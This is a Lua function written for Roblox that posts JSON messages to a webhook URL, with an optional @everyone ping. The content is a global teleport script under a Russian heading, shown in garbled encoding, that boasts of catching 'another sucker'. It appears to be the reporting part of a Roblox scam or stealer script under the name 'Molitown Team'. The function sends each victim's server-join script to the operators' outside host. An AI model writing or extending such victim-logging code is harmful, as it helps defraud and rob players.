function SendMessageEMBED(url, embed, bool)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    -- Ð¤Ð¾Ñ€Ð¼Ð¸Ñ€ÑƒÐµÐ¼ ÐºÐ¾Ð½Ñ‚ÐµÐ½Ñ‚ Ñ Ñ‚ÐµÐ»ÐµÐ¿Ð¾Ñ€Ñ‚Ð¾Ð¼ Ð² ÑÑ‚Ð¸Ð»Ðµ Ð¿ÐµÑ€Ð²Ð¾Ð³Ð¾ ÐºÐ¾Ð´Ð°
    local teleportContent = "ðŸŽ¯ **Ð’Ð¬Ð•Ð‘ÐÐ** ÐžÑ‡ÐµÑ€ÐµÐ´Ð½Ð¾Ð¹ ÐºÑƒÐºÐ¸Ñ‡:\n\n" .. TeleportScript
    
    local data = {
        ["username"] = "M O L I T O W N",
        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
        ["content"] = teleportContent,
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = "Molitown Team 2025 | debugged for 6h"
                }
            }
        }
    }
    
    local data2 = {
        ["username"] = "M O L I T O W N", 
        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg", 
        ["content"] = "-- @everyone\n" .. teleportContent,
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = "Molitown Team 2025 | debugged for 6h"
                }
            }
        }
    }
    
    local body = http:JSONEncode(data)
    local body2 = http:JSONEncode(data2)

    if bool == true then
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body2
        })
    else
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

